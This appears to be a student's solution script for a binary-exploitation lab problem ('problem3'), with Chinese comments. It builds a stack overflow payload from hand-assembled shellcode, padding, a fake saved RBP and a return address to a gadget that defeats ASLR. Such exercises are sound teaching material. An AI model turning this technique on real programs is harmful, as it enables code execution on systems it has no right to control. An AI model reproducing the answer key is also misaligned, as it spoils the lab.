import struct

# --- 1. Shellcode 构造 ---
# 目标: func1(114)
# func1 地址: 0x401216
# 参数: 114 (0x72)
# 机器码逻辑: 
#   mov edi, 0x72       -> bf 72 00 00 00
#   mov eax, 0x401216   -> b8 16 12 40 00
#   call rax            -> ff d0
shellcode = b"\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0"

# --- 2. 计算填充 ---
# 缓冲区大小: 32 bytes
# Shellcode 长度: 12 bytes
# 剩余填充空间: 32 - 12 = 20 bytes
padding_len = 32 - len(shellcode)
padding = b'A' * padding_len

# --- 3. 覆盖栈帧信息 ---
# Fake RBP (8 bytes): 随便填，func1 会自己建立新栈帧，这里不影响
fake_rbp = b'B' * 8

# --- 4. 覆盖返回地址 ---
# 目标: 跳转到 jmp_xs (0x401334)
# 为什么要跳这里？因为它会计算出缓冲区的栈地址并跳回来执行我们的 Shellcode
# 这样我们就不用担心 ASLR 导致的栈地址变化了
jmp_xs_addr = struct.pack('<Q', 0x401334)

# --- 5. 组合 Payload ---
payload = shellcode + padding + fake_rbp + jmp_xs_addr

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload generated! Size: {len(payload)} bytes")
print("Shellcode method used. Run: ./problem3 ans3.txt")